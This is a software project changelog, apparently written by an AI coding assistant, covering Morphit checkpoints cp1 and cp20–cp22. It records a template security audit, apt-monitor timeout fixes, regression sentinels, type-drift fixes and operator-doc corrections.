- **AV15** (same as AV14): identical pattern on the `apt list --upgradable` line. → **Bundled into F2 fix.**
- **AV16** (Tampering): §17 free-form field accepts hostile content. → **NOT_A_BUG** — Forgejo's markdown render handles this; not a template-introduced surface.
- **AV17** (Type safety): ChatAdmissionResponse type drift from cp21 was actually fixed end-to-end. → **VERIFIED** — typecheck-sweep clean post-`npm install`; schema-as-contract smokes now actually execute the satisfies-clauses.
- **AV18** (Sentinel-doc alignment): persona-walkthrough sentinels match the cp22-edited doc state. → **VERIFIED** — all three P121-DOC sentinels pass against current doc state.
- **AV19** (Context drift): residual offline-context language in the auto-loaded Forgejo body. → **CLEAN** — cp20-fix2 already removed "copy this and paste it" line; grep confirms zero remaining instances.
- **AV20** (Sentinel coverage for F1 fix): need regression sentinel for the new STOP banner placement. → **SHIPPED** — new `P122-CP1-F1` sentinel with new `assertOrdering` field on Scenario interface. Self-tested by tampering.
- **AV21** (Side effects): the new `set +e/-e` pattern in apt-monitor doesn't break anything else. → **VERIFIED** — live-test with mocked apt-get scenarios (success-path-with-no-root → emits `apt_refresh_failed exit_code=100`; timeout-fire → emits `apt_refresh_failed exit_code=124`); main upgrade-count path still works.
- **AV22** (Defense bypass): could the TS6133 regex fix be bypassed? → **NOT_A_BUG** — regex is for noise-filtering, not security defense. Worst case is more typecheck output (more noise visible to dev), never less.
- **AV23** (Supply chain depth): could the upload-artifact SHA pin be subverted via a typosquat? → **NOT_A_BUG** — SHA pinning specifically defends against tag-mutation; an attacker would need to compromise GitHub itself (out of scope).
- **AV24** (Sidecar observability sweep): other sidecars (dmesg-monitor, journald-monitor, smartctl-monitor) have similar `|| true` patterns. → **FILED as F4** — same shape as F2 but those sidecars are pre-cp20 and out of cp1 scope. Will sweep in cp2.

### Findings disposition

| ID | Severity | Status | Description |
|----|----------|--------|-------------|
| F1 | HIGH | ✅ FIXED cp1 | Security warning placement (§16 → STOP banner above §1) |
| F2 | MEDIUM | ✅ FIXED cp1 | apt-monitor silent timeout masking (now emits INFO events on failure) |
| F3 | (audit) | FILED cp2 | Schema-as-contract pattern generalization audit |
| F4 | LOW | FILED cp2 | Observability sweep across other sidecars |

### What shipped

**F1 fix** — `.forgejo/issue_template/bug_report.md` + `docs/NEW-ISSUE-FOUND.md` + `docs/NEW-ISSUE-FOUND.txt` all get a STOP banner prepended before §1. The Forgejo template's banner is a blockquote with `## ⚠ STOP — read this first if your bug involves security` heading, the "DO NOT POST IT HERE" alarm, and the `@agorise:matrix.org` mxid. Bottom paragraph references §16 ("still fill it in if you're sure your report is safe to post publicly") so the detailed triage form retains its meaning. Markdown copy mirrors the same structure; plain-text copy uses ASCII separators (`====`) since blockquote markdown wouldn't render well in plaintext.

**F2 fix** — `ops/scripts/morphit-apt-monitor.sh` `set +e/-e` blocks capture exit codes from both `apt-get update -qq` and `apt list --upgradable`. On non-zero exit, emits an INFO-tier event (`apt_refresh_failed` or `apt_list_failed`) with `exit_code` + `hint` payload fields. Hint string lists the common exit-code meanings (124=timeout, 100=dpkg lock, other=mirror error). Live-tested: both timeout and dpkg-lock scenarios emit correctly.

**Classifier wiring (cp1 wire-discipline)** — `apps/matrix-bot/src/classifier.ts` ALERT_COPY map gains `apt:apt_refresh_failed` and `apt:apt_list_failed` entries with operator-helpful advice (point at `journalctl -u morphit-apt-monitor`, suggest `sudo apt-get update` manual run for diagnosis). `apps/matrix-bot/scripts/classifier-smoke.ts` gains 2 INFO-tier scenarios pinning the tier policy (98 → 100 scenarios). Classifier's fallback-to-INFO branch handles unrecognized events, so the new ones route correctly without changes to CRITICAL_MATCHERS / WARN_MATCHERS.

**F1 regression sentinel** — `apps/web/scripts/persona-walkthrough-smoke.ts` gains a new `assertOrdering` field on the `Scenario` interface (with corresponding runner-loop logic) so a sentinel can require that one substring appears at a SMALLER byte offset than another. New `P122-CP1-F1` sentinel uses this to lock the STOP banner placement: banner phrase must appear in the file AND must precede the `## 1. One-line summary` header. Self-tested by tampering: temporarily removing the banner causes the sentinel to fail loudly with `MUST HAVE (not found)` + ordering-error.

### Verification

- Triple-pulse 2,910 × 3, 0 failures (cp22 baseline 2,907 → cp1 baseline 2,910 = +1 F1 sentinel + 2 apt INFO classifier scenarios)
- Typecheck-sweep 0 errors across all 9 workspaces
- Live-run of `morphit-apt-monitor.sh` with mocked systemd-cat post-F2 fix: both success path and timeout path emit correct LogRecord envelopes
- sidecar-envelope-smoke still passes apt-monitor with the new emit() calls (26 envelope checks hold)
- F1 sentinel self-tested under tampering: failure fires with correct diagnostic; restoration → clean
- ansible-lint NOT re-verified (sandbox doesn't have it; cp1 touched zero Ansible files)

### Pattern lessons

1. **Placement of security warnings matters as much as their content.** Cp20 shipped a thorough §16 security-disclosure form. Cp1 found that placing it at section 16 of a 17-section template meant the warning fired AFTER the user could disclose the vuln in §1. Lesson: when a defense's effectiveness depends on user behavior (read top-to-bottom, fill top-to-bottom), the defense must come BEFORE the field being defended.

2. **`assertOrdering` is the right primitive for placement-sensitive defenses.** Adding `mustHave: ['STOP banner phrase']` would have passed even if the banner moved to §16. The fix needs to assert "banner before §1," which is a positional constraint. New sentinel primitive — reusable for any future placement-sensitive defense.

3. **Silent-failure timeouts are observable-failure timeouts in disguise.** apt-monitor.sh wrapped `apt-get update` in `timeout 20 ... || true` to keep the smoke happy (cp22 fix). The smoke is happy; operators are blind. Defense-in-depth requires *both* the smoke-protecting timeout AND an observable signal that the timeout fired. Future timeout-wraps should default to emitting an INFO event on non-zero exit, not just swallowing it.

4. **Cp21's "silently no-op" lesson generalizes.** The 20 type-drifts cp21 surfaced are one instance of a broader pattern: defense layers that "pass" against an incomplete verification environment. F3 (filed) is the next audit — sweep for other defense layers that might "pass" only because their preconditions aren't fully exercised (e.g. mustNotHave-style sentinels asserting absence of strings that were renamed elsewhere; smokes that import deps that resolve no-op stubs; integration tests that pass against mocks but never against real services).

5. **Black-hat audits open with AV-enumeration, not code-walking.** 24 vectors enumerated in ~15 minutes of analysis before any code edits. 2 real findings (F1+F2). 2 filed for cp2 (F3+F4). 18 confirmed-clean with reasoned dispositions. Code-walking the same surface area would have taken 5-10× longer and probably missed F1 entirely (which is a UX-placement issue, not a code-pattern issue).

### Files modified

- `.forgejo/issue_template/bug_report.md` — STOP banner prepended before §1 (F1 fix)
- `docs/NEW-ISSUE-FOUND.md` — matching STOP banner (offline copy parity)
- `docs/NEW-ISSUE-FOUND.txt` — matching STOP banner with ASCII separators (plain-text copy parity)
- `ops/scripts/morphit-apt-monitor.sh` — `set +e/-e` blocks capture exit codes + emit `apt_refresh_failed`/`apt_list_failed` INFO events (F2 fix)
- `apps/matrix-bot/src/classifier.ts` — 2 new ALERT_COPY entries for the F2 events
- `apps/matrix-bot/scripts/classifier-smoke.ts` — 2 new INFO-tier scenarios (98 → 100 scenarios)
- `apps/web/scripts/persona-walkthrough-smoke.ts` — new `assertOrdering` field on Scenario interface + runner-loop logic + new P122-CP1-F1 sentinel (109 → 110 scenarios)
- `TARBALL.md` — this entry
- `docs/REVISIT-LIST.md` — Part 122 cp1 maintained-line + F3/F4 follow-ups
- `docs/AUDIT-2026-05.md` — cp1 entry

No brag-list edit (internal security hardening per cp19 discipline). No ADR edit (no architectural shift). No locale edits (English-only template strings — note: this is consistent with how cp20 shipped the template; the form is intended for technical bug reporters who'll typically be English-comfortable, and the i18n cost vs reach trade-off for a 17-section operator-triage form is unfavorable. Filed REVISIT for "should bug-report template be i18n'd?" — out of cp1 scope).

---

## Part 121 cp22 — sidecar-envelope-smoke flake fix + sysadmin-handoff doc walk + audit-TODO closures

### Pretext

Cp21 sealed with an explicit honest disclosure: across ~7 pulses, ONE flaked at 2,881 scenarios / 1 runner failed (count signature matched a 24-scenario smoke). Memory #12 said `drain-defense-live-fire` was root-caused + fixed in Part 85, but the count was suggestive. Filed for cp22 characterization. cp22 opened with the question: characterize the intermittent, then plow through the remaining cp21-pending items (TS6133 regex fix, upload-artifact SHA bump, mount-sweep overlay extension, sysadmin-handoff doc walk).

### What shipped this turn

**(a)** **Sidecar-envelope-smoke flake characterized + fixed.** Empirically counted scenarios across all candidates: `drain-defense-live-fire` actually emits `✓ all 23 scenarios passed` (not 24), `feedback-handler-smoke` / `operator-earnings-smoke` / `listener-dispatch-smoke` / `sidecar-envelope-smoke` all emit 24. Of those four, only `sidecar-envelope-smoke` has environmental dependencies (spawns 12 real bash sidecars via `spawnSync` with 30s budget each). Live-timed each sidecar individually in this sandbox: `apt-monitor.sh` clocks at 2.778s with `apt-get update` doing real work against canonical mirrors. On Ken's box under slow-mirror conditions (IPv6 stall, mirror under load, captive portal), `apt-get update` can exceed 30s, spawnSync SIGKILLs the bash tree, `r.status === null`, scenario fails, smoke exits 1, run-smokes.sh counts 0 not 24 → baseline drops by exactly 24. Matches cp21's math precisely (2,905 − 24 = 2,881).

Two-layer fix:
- `ops/scripts/morphit-apt-monitor.sh`: `apt-get update -qq` → `timeout 20 apt-get update -qq`; `apt list --upgradable` → `timeout 10 apt list --upgradable`. Inner timeouts mean apt can never blow the smoke's budget. `|| true` continues even on timeout so stale package lists still produce usable counts.
- `apps/matrix-bot/scripts/sidecar-envelope-smoke.ts`: `spawnSync` `timeout: 30_000` → `timeout: 60_000` (belt-and-braces for every other sidecar). Failure detail now surfaces SIGTERM signal via new `signal` field on `RunResult` so future timeouts are debuggable instead of opaque `exited null`.

Two new regression sentinels added to the smoke (24 → 26 scenarios):
- `apt-monitor.sh wraps apt-get update in 'timeout' (cp22)` — regex-greps for `timeout\s+\d+\s+apt-get\s+update`.
- `sidecar-envelope-smoke spawnSync timeout is at least 60_000ms (cp22)` — self-grep on `timeout:\s*(\d[\d_]*)` and parse, asserts ≥ 60_000.

Self-tested: temporarily reverted apt-monitor's timeout → sentinel fires correctly with the right diagnostic; restored → 26/26 green. Stress-tested under serial pressure: 15 sequential runs all clean.

**(b)** **Sysadmin-handoff persona walk** across the four operator docs (OPERATIONS.md / RUN-A-MORPHIT-NODE.md / PRE-LAUNCH-CHECKLIST.md / LAUNCH-DAY.md) plus the BETA-INCIDENT-RUNBOOK. Caught 4 real drifts:
- **Stale "13 runners" claim** in three docs (OPERATIONS.md §Smoke-suite troubleshooting, PRE-LAUNCH-CHECKLIST §C, RUN-A-MORPHIT-NODE §npm-install blurb). Empirically only 6 smokes fail with `ERR_MODULE_NOT_FOUND` in a no-deps clone today (smokes have been refactored across cp9–cp21). Replaced the hard count with stable phrasing ("several runners (typically single digits — the count drifts each release...)") that won't drift each part. The list of example affected smokes also updated to the current set: `order-handler`, `rss-orderbook`, `rss-orderbook-xml-validate`, `edit`, `edit-rpc`, `surface-invariant`. Persona-walkthrough-smoke sentinels still match — they pin `ERR_MODULE_NOT_FOUND` + `@morphit/asset-registry` + `npm install --no-audit --no-fund`, not the count.
- **Stale ~2,296 scenarios baseline** in LAUNCH-DAY.md §smoke-suite step (cp14-era number, way behind 2,907) and PRE-LAUNCH-CHECKLIST.md (cp1-era `2370+`). Bumped both to `2,900+ scenarios passed, 0 runners failed (baseline ticks up as smokes are added each release)`.
- **Ghost env var `MORPHIT_RELAY_CREATE_PER_IP_DAILY`** in BETA-INCIDENT-RUNBOOK.md §5 (relay drain defense). Real name is `MORPHIT_RELAY_CREATE_RATE_PER_DAY` (default 2); also surfaced `MORPHIT_RELAY_CREATE_RATE_PER_HOUR` (default 5) as the companion knob. Operator following the runbook literally would have hit "no such env var" — silent ops failure at exactly the worst moment.
- **Ghost `morphit-web.service`** reference in OPERATIONS.md §37.5 (process hardening). The web frontend has NO systemd unit — it's static HTML/CSS/JS served by nginx from `/var/www/morphit-web` (root path set in `ops/nginx/web.conf`). Replaced the bullet with an inline callout explaining hardening for the web tier is an nginx-config concern, not systemd.

Cross-check verified zero remaining ghost service references and zero ghost env vars in the runbook. All 30 systemd units referenced in operator docs exist in `ops/systemd/`; all 30 real units are referenced by name in OPERATIONS.md or RUN-A-MORPHIT-NODE.md.

**(c)** **Mount-sweep pseudo-FS skip-list extended** in `ops/scripts/morphit-host-monitor.sh`:
- Added `overlay`, `overlay2`, `fuse.fuse-overlayfs`, `aufs` — Docker storage drivers (and Podman's rootless analog). Without these, every Docker-hosted node would surface its container-root mount as `mount_*` events that double-count the underlying disk.
- Added `rpc_pipefs`, `nfsd` — Kernel-internal NFS pseudo-FS that never has meaningful disk usage.
- Added `fuse.rclone`, `fuse.s3fs`, `fuse.sshfs` — Network filesystems where `df` percentages are meaningless (object stores) or stall the sweep (sshfs). Sandbox `df --output=target,pcent,fstype` shows `fuse.rclone` mounts at 0% which would either over-trigger or under-trigger the threshold logic.
- OPERATIONS.md §Host-monitor env tuning sync'd with the expanded skip-list rationale.

**(d)** **TS6133 noise-filter regex fix** in `scripts/typecheck-sweep.sh`. Per cp21's filed bug, the pattern `error TS6133 .* is declared but` requires a literal SPACE between `TS6133` and `.*`, but real TypeScript emits `error TS6133: '<name>' is declared but its value is never read.` — a colon, not a space. Fixed to `error TS6133[ :].* is declared but` so the character class matches either format. Empirical test against both formats: both match correctly. All 9 workspaces still 0 errors post-fix (no unused-variable warnings currently emit, but if one appears it'll now be correctly noise-filtered).

**(e)** **`actions/upload-artifact` SHA-pinned** at `ea165f8d65b6e75b540449e92b4886f43607fa02` (v4.6.2, 19 Mar 2025). Verified via the release tag page on github.com/actions/upload-artifact; commit signed by GitHub's verified GPG key B5690EEEBB952194. Chose v4.6.2 over v5/v6/v7 because those bump the Node.js runtime and we stay at v4 for parity with `actions/checkout@v4.2.2` + `actions/setup-node@v4.0.3`. All three workflow actions are now 40-char SHA-pinned. Closes cp18 AUDIT-CI-2 TODO.

### Why this matters beyond the immediate fixes

cp21's honest disclosure was important precisely because it caught the flake before it became silently green-washed. The cp22 root-cause analysis was a one-session characterization because the count signature (24) plus the post-`npm install` requirement (cp21's other lesson) plus an empirical scenario-count census across the suite pointed at exactly the right smoke. The two-layer fix (apt inner timeout + smoke outer timeout) is defense-in-depth: a future sidecar that develops similar issues will be caught by the outer 60s budget before manifesting as a flake, while the inner per-call timeouts mean we don't spend the budget on apt alone.

The sysadmin-walk drift catches are the kind of thing that bites operators in the worst moment — the BETA-INCIDENT-RUNBOOK §5 ghost env var would have surfaced exactly when an operator is debugging a CGNAT drain attack. That's the canonical "doc-vs-code drift compounds silently until you need the doc" pattern from Memory #11 + cp21's "verify before claiming" rule.

### Verification

- Triple-pulse 2,907 × 3, 0 failures (cp21 baseline 2,905 → cp22 baseline 2,907 = +2 from the new sidecar-envelope-smoke sentinels)
- 15-run sequential stress test of `sidecar-envelope-smoke` post-fix: 15/15 clean
- Typecheck-sweep 0 errors across all 9 workspaces
- ansible-lint NOT re-verified (sandbox doesn't have it; cp22 touched zero Ansible files)
- release.yml YAML parses cleanly post-SHA-pin
- Live-run of `morphit-apt-monitor.sh` with mocked systemd-cat post-`timeout` wrap: correctly emits `security_updates_critical` for the 29 pending security updates in this sandbox

### Pattern lessons

1. **Scenario-count math is forensically useful.** cp21 disclosed "baseline -24". Census of every smoke's scenario count narrowed candidates to exactly four. Only one had environmental dependencies. The diagnosis was 30 seconds of empirical work. Lesson: when a flake's count signature is specific, run a count census across the suite before guessing at causes.
2. **Inner + outer timeouts are belt-and-braces.** `apt-monitor.sh` now has `timeout 20` on `apt-get update` AND the smoke has 60s `spawnSync` budget. The inner protects the smoke; the outer catches any other sidecar that develops similar issues. Both layers are sentinel-locked.
3. **Stable phrasing > pinned numbers in operator docs.** The "13 runners" claim drifted three times in three Parts. Replacing it with "several runners (typically single digits — drifts each release)" buys permanent freedom from this drift class.
4. **Ghost env-var names hit operators at the worst moment.** BETA-INCIDENT-RUNBOOK §5 is read while debugging a live drain — the operator running `export MORPHIT_RELAY_CREATE_PER_IP_DAILY=10` would have gotten "ok no error" but the relay wouldn't have changed behavior because the env var doesn't exist. Cross-checking every doc-mentioned env var against config schema before tarball is now the discipline.
5. **Empirical SHA verification matters.** The upload-artifact SHA pin came from the release-tag page on github.com (not a search snippet, not memory). GitHub's verified GPG signature on the commit is the trust anchor. Future SHA bumps follow the same pattern.

### Files modified

- `ops/scripts/morphit-apt-monitor.sh` — `timeout 20` on `apt-get update`, `timeout 10` on `apt list`, explanatory comments
- `ops/scripts/morphit-host-monitor.sh` — pseudo-FS skip-list extended with 9 additional fstypes (Docker overlays + NFS pseudo-FS + network FUSE)
- `apps/matrix-bot/scripts/sidecar-envelope-smoke.ts` — `spawnSync` timeout 30→60s, `signal` field on `RunResult`, 2 new regression sentinels (24 → 26 scenarios)
- `apps/web/scripts/persona-walkthrough-smoke.ts` — docblock comment updated to reflect stable phrasing for the ERR_MODULE_NOT_FOUND sentinels
- `scripts/typecheck-sweep.sh` — TS6133 noise-filter regex `TS6133 .* is declared` → `TS6133[ :].* is declared`
- `.forgejo/workflows/release.yml` — `actions/upload-artifact@v4` → `@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2`
- `docs/OPERATIONS.md` — Smoke-suite troubleshooting block rewritten with stable phrasing; §37.5 ghost `morphit-web.service` removed with nginx-static callout; mount-sweep env-doc updated with extended skip-list rationale
- `docs/RUN-A-MORPHIT-NODE.md` — "13 runners" → "several runners"
- `docs/PRE-LAUNCH-CHECKLIST.md` — "Total: 2370+" → "Total: 2,900+", "13 runners" → "several runners"
- `docs/LAUNCH-DAY.md` — "~2,296 scenarios" → "2,900+ scenarios"
- `docs/BETA-INCIDENT-RUNBOOK.md` — ghost env var `MORPHIT_RELAY_CREATE_PER_IP_DAILY` → real `MORPHIT_RELAY_CREATE_RATE_PER_DAY` (+ `_PER_HOUR` companion)
- `TARBALL.md` — this entry
- `docs/REVISIT-LIST.md` — Last maintained line updated, three cp21 items closed (TS6133 regex, intermittent flake, upload-artifact SHA bump)
- `docs/AUDIT-2026-05.md` — cp22 entry

No brag-list edit (internal infrastructure + operator-doc drift cleanup per cp14 discipline). No ADR edit (not architectural). No locale edits (no user-facing strings touched). No schema migration (no DB changes).

---

## Part 121 cp21 — stale-route cleanup + latent matrix-bot type-drift fix + regression sentinel

### Pretext

Ken pulled the cp20-fix2 tarball apart for a "where do we go next?" audit. The first deep-dive found 23 leaf-route directories + the dynamic account route + the `dev/` and `my/` containers (25 total) all duplicated between `apps/web/src/routes/<name>/` AND `apps/web/src/routes/[lang]/<name>/`. The cp7 commit message said "physically moved" but Ken's local + Forgejo had only seen the cp7+ DELTA tarballs, which by definition can't communicate deletions — so the cp7 MOVE was applied to him as an ADD, and the old top-level copies silently persisted. Some pairs were byte-identical (cheat-sheet, compare, faq, glossary, instances, plan, scan-login, security, privacy-terms); most had drifted (the `[lang]/` copy got the cp7 localePath() wrapping + subsequent Part-specific additions; the top-level copy didn't). Most consequential drift: `routes/support/+page.svelte` top-level was **missing the entire cp9 Matrix-group-chat block** that exists in `[lang]/support/+page.svelte` — a fresh visitor hitting bare `/support` would have seen a degraded support page without the operator's Matrix room link.

Initial framing (mine, in conversation) reached for the "stale bookmark / SEO-indexed external link" risk angle — Ken correctly pushed back that NOBODY has the URL yet (not even the sysadmin), so that framing was bogus. Real reasons cleanup still matters: (a) maintenance hazard — every page change is now applied to one copy or the other, drift compounds silently; (b) build artifact correctness — `npm run build` prerenders ~370 HTML files when it should be ~200; (c) code-review cleanliness — sysadmin opening `apps/web/src/routes/` and seeing duplicates asks "which one is real?"

### What shipped this turn

**(a)** **Stale-route cleanup workflow** — Ken archived his local, emptied his working tree but kept `.git/`, extracted the clean tarball, `git add -A`, committed, pushed to Forgejo. After cp21, `apps/web/src/routes/` contains EXACTLY: `+layout.svelte` (minimal redirect-shell wrapper), `+layout.ts` (prerender config + ssr=false), `+page.svelte` (the locale-detection redirect via `pickLocaleFromAcceptLanguages()`), and `[lang]/` (the localized subtree with 25 leaf routes + the redirect-shell `+page.ts` carrying `entries()`).

**(b)** **`apps/web/scripts/no-stale-top-level-routes-smoke.ts` regression sentinel** (NEW, 19 scenarios) — locks the post-cp7 invariant against future regression. Scenarios cover: routes/ has NO unexpected top-level directories (only `[lang]/` allowed), routes/ has NO unexpected top-level files (only the 3 redirect-shell files), each of the 3 redirect-shell files exists, the `[lang]/` directory exists, `[lang]/` has ≥20 entries, the redirect shell references `pickLocaleFromAcceptLanguages` (cp7 design proof), the layout file explains the minimal-chrome rationale, and explicit per-leaf "no stale top-level /<leaf>/ directory" checks for the 10 most commonly drifted leaves (orderbook, post, chat, my, settings, support, login, onboarding, about-this-instance, run-a-node). The per-leaf checks give readable failure output when this specific regression recurs ("found at apps/web/src/routes/<leaf>/") rather than a generic "unexpected directories" blob. Registered in `scripts/run-smokes.sh` right after `path-adversarial-smoke` (thematic grouping — both deal with the routes restructure). Verified by inserting a stale `routes/orderbook/+page.svelte` and running the smoke: 2 of 19 scenarios fail cleanly with the right diagnostic; rm + re-run: 19/19 green.

**(c)** **Latent matrix-bot smoke type-drift fix (20 errors closed)** — surfaced when `npm install` ran in cp21's sandbox and the `@morphit/indexer-client` imports actually resolved. Pre-cp21, every typecheck-sweep run was in a no-deps sandbox where `@morphit/*` imports failed with "Cannot find module" (noise-filtered as expected), so the `satisfies <InterfaceFromIndexerClient>` clauses in the cp16-cp17 schema-as-contract smokes never executed. Cp20-fix2's "Typecheck-sweep: 0 errors" gate was technically accurate in that sandbox but latently wrong.

Errors fixed:
- `apps/matrix-bot/scripts/api-response-shape-smoke.ts`:
  - `ErrorResponse.code: 'order_not_found'` → `'not_found'` (ErrorCode enum is the union not_found|bad_request|rate_limited|internal|service_starting; `order_not_found` was never valid)
  - `sampleInstanceDirEntry` was missing 10 of 14 required fields; expanded to full shape
  - `sampleOrder` was missing required `created_at`/`updated_at`/`expires_at` (cascaded to `FeaturedSlot`, `OrderbookResponse`, `AccountOrdersResponse`)
  - `sampleFeedbackSummary` was `{total, positive, negative, positive_pct}` — drifted; canonical is `{count, weighted_rating, by_rating}`
  - `sampleChatAdmission` was `{admitted: true}` only; current shape adds `me`, `peer`, `reason`
  - `sampleChatMessage` was `{from, to, body}` — drifted; canonical is `{sender, recipient, ciphertext, header}` (matches ADR-0015 E2EE shape — chat is opaque to the indexer)
  - `sampleAttestorEligibility.reason: 'satisfies_launch_phase'` not in enum; canonical eligible reasons are loyalty|age|both
  - `sampleInstanceDirectory` (the wrapper) was missing required `version`/`directory_updated_at`
  - Companion zod schemas (`ChatMessageRecordSchema`, `InstanceDirectoryEntrySchema`, `OrderRecordSchema`, `FeedbackSummarySchema`, `ChatAdmissionSchema`) all updated to match
  - Negative-test scenario for FeedbackSummary updated: was "drop the `positive` field"; now "drop the `count` field"
- `apps/matrix-bot/scripts/sse-stream-shape-smoke.ts`:
  - Same three sample drifts (OrderRecord, InstanceDirectoryEntry, ChatMessageRecord) — fixed both samples + zod schemas
- `apps/matrix-bot/scripts/render-alert-hardening-smoke.ts`:
  - `ClassifiedAlert` sample missing required `category` field (cp9 added the AlertCategory discriminant on ClassifiedAlert after this smoke was first written); set to `'host-resource'` matching the `module: 'dmesg'` event-source
- `packages/asset-registry/src/index.ts`:
  - Proxy `get` trap signature `(target, prop, receiver)` had unused `receiver` (TS6133); shortened to `(target, prop)` since Proxy traps don't require all 3 params

### Why this matters beyond the immediate fix

The schema-as-contract pattern (cp14-cp17) was working as designed — it caught real drift between the matrix-bot smokes and the indexer-client types. It just wasn't *running* in any prior sandbox because npm install wasn't being done. Cp21 closes both layers: the drift itself AND the structural reason the drift hadn't surfaced.

### Verification

- Triple-pulse 2,905 × 3, 0 failures (cp20-fix2 baseline 2,886 → cp21 baseline 2,905 = +19 from the new sentinel smoke)
- Typecheck-sweep 0 errors across all 9 workspaces (post-`npm install` — see honest-disclosure note above; this is meaningfully stronger than cp20-fix2's 0-error gate which was in a no-deps sandbox)
- ansible-lint NOT re-verified (sandbox doesn't have it; cp20-fix2 sealed clean; cp21 touched zero Ansible files)
- New sentinel smoke verified to FAIL correctly when regression returns + PASS correctly after cleanup

### Pattern lessons

1. **Delta tarballs CANNOT communicate deletions or moves.** Cp7 was the first structural-move checkpoint after the cp11 delta convention was adopted. The move read as an add to every recipient. This is now a memory rule: **at any structural-move checkpoint, ship a FULL tarball, not a delta.** Same rule for any "delete file X" checkpoint that isn't accompanied by an explicit cleanup script.
2. **Schema-as-contract smokes only execute when the typed imports resolve.** If the typecheck sandbox doesn't have `npm install` done, satisfies-clause cross-checks silently no-op. Pre-cp21 typecheck-sweep claimed "0 errors" while 20 real type-drift errors lurked. Fix posture: typecheck-sweep should attempt `npm ci --ignore-scripts` if `node_modules` is missing, or refuse to claim "0 errors" without disclosing the resolution state of `@morphit/*` imports. Filed REVISIT for next session.
3. **Initial framings can over-reach.** I reached for "stale bookmarks + SEO" as the urgency angle for the route cleanup; Ken correctly pushed back that no users exist yet so no bookmarks exist. Real reasons (maintenance hazard, build artifact correctness, code-review cleanliness) were enough. Lesson: when proposing urgency, check the user-existence assumption.
4. **Honest disclosure when verification can't run.** ansible-lint not installed in sandbox → disclose, don't claim. Memory rule #19 reinforced.

### Files modified

- `apps/web/src/routes/<25 stale dirs>/` — DELETED via Ken's workflow
- `apps/web/scripts/no-stale-top-level-routes-smoke.ts` — NEW (19-scenario sentinel)
- `scripts/run-smokes.sh` — +1 registration line (after path-adversarial-smoke)
- `apps/matrix-bot/scripts/api-response-shape-smoke.ts` — 7 sample literals + 5 zod schemas rewritten
- `apps/matrix-bot/scripts/sse-stream-shape-smoke.ts` — 3 sample literals + 3 zod schemas rewritten
- `apps/matrix-bot/scripts/render-alert-hardening-smoke.ts` — `category` field added to ClassifiedAlert helper
- `packages/asset-registry/src/index.ts` — Proxy `get` trap signature trimmed
- `TARBALL.md` — this entry
- `docs/REVISIT-LIST.md` — Last maintained line updated, two new entries (filter-regex bug + sandbox npm-install for typecheck)
- `docs/AUDIT-2026-05.md` — cp21 entry

No brag-list edit (internal repo hygiene + smoke infrastructure, not public-facing per cp14 discipline). No ADR edit (not architectural). No locale edits (no user-facing strings changed). No schema migration (no DB changes).

### Retrospective — what cp21 tells us about cp22+

Ken's sysadmin gets the repo "in a few days." Cp21 just established that the full-tarball convention applies at structural-move checkpoints — which the sysadmin handoff IS (going from "lives only on Ken's laptop" to "lives on a sysadmin's laptop AND on Forgejo"). The cp21 tarball is the full handoff vehicle. The next checkpoint cp22 likely covers: (a) sysadmin-handoff persona walk against OPERATIONS.md / RUN-A-MORPHIT-NODE.md / PRE-LAUNCH-CHECKLIST.md / LAUNCH-DAY.md catching any cp9-cp20 surface that drifted vs the docs; (b) the upgrade-tooling work parked for the release week (~2026-05-22). Both can plow in one session if Ken wants.

---

## Part 121 cp20-fix2 — drop redundant "paste into a new issue" line from auto-loaded template

The line `Copy this whole file, paste it into a new issue at <…/issues>, or send it directly to the operator who invited you.` was useful in `docs/NEW-ISSUE-FOUND.md` (the offline copy people read standalone) but is nonsensical in `.forgejo/issue_template/bug_report.md` — by the time it auto-loads into the comment field, the tester is already on the new-issue page.  Removed it from the Forgejo template only; `docs/NEW-ISSUE-FOUND.md` keeps the line for offline/email use.  Section count still 17; "Thanks for taking the time to report this..." preamble kept (still useful context).  Triple-pulse 2,886 × 3 clean.

---

## Part 121 cp20-fix — picker contact_link re-routed from operator DM to public community room

### Pretext

After cp20 first-cut Ken pushed back: he doesn't want his personal Matrix MXID promoted on the public picker UI in the Forgejo repo (spam/harassment/doxxing exposure once it's in git history forever).  Initial proposed swap was `@agorise:matrix.org` → `#agorise:matrix.org` in the URL — but per memory rule #14, that would mis-route security disclosures to a public channel.  Pushed back on the implementation, satisfied the goal correctly.

### What changed

`.forgejo/issue_template/config.yml`:
- Picker `contact_link` renamed from "Security disclosure (private)" to "Community chat"
- URL switched to `https://matrix.to/#/#agorise:matrix.org` (public room alias)
- Description rewritten as a community-resource pitch, NOT "DM the operator"
- Explicit caveat added: "For SECURITY-SENSITIVE issues ... DO NOT post here either; the bug-report template has the right private channel in section 16."

`bug_report.md` §16 is UNCHANGED: still has `@agorise:matrix.org` as the security-disclosure DM mxid.  Testers who load the bug-report form and read down to §16 see the security path.  Repo browsers clicking "New Issue" see only the community room.

### Updated sentinel

`P121-CP20-2` now asserts both `mustHave` (Community chat + public room URL) AND `mustNotHave` (the personal MXID URL + the old "Security disclosure (private)" wording) — locks the picker against accidentally re-promoting the security DM in a future refactor.

### Verification

Triple-pulse 2,886 × 3, 0 failures.  YAML still validates.  Memory #4 updated.

### Pattern lesson

When an operator pushes back on a security-design choice, the underlying concern is usually right (here: don't promote personal MXID publicly) BUT the proposed fix may still cause a different harm (swap `@` → `#` routes security disclosures to public room).  Treat the request as input on the GOAL, not a directive on the IMPLEMENTATION.  Push back on the implementation, satisfy the goal correctly.

---

## Part 121 cp20 — what's shipped (beta-tester intake form re-shipped at canonical Forgejo path)

### Pretext

Ken asked to implement the Forgejo issue template so it always loads on "New Issue."  Memory entry #4 records that Part 48 shipped this, but the `.forgejo/issue_template/NEW-ISSUE-FOUND.md` file was NOT present in current repo state — lost somewhere in a later refactor.  Re-shipped this turn at canonical path.

### What shipped

**`.forgejo/issue_template/bug_report.md`** (renamed from NEW-ISSUE-FOUND.md for cleaner convention) — Forgejo issue template with frontmatter that auto-loads the body into the "Leave a comment" field when a tester clicks "New Issue":
- `name: "Bug report"` — appears in template picker
- `title: "[bug] "` — auto-prefix; enables `title:[bug]` triage filtering
- `labels: [needs-triage]` — auto-applies on submission
- `ref: main` — pins template to main branch (no drift across feature branches)

Body: full 17-section intake form from `docs/NEW-ISSUE-FOUND.md` (summary → goal → behavior → severity → context → repro → time → environment → connection → device → privacy → console → network → tester → recent changes → security triage → free-form).

**`.forgejo/issue_template/config.yml`** — picker-config that forces the template to be the only path:
- `blank_issues_enabled: false` — no "Open a blank issue" escape that would bypass the §16 security warning
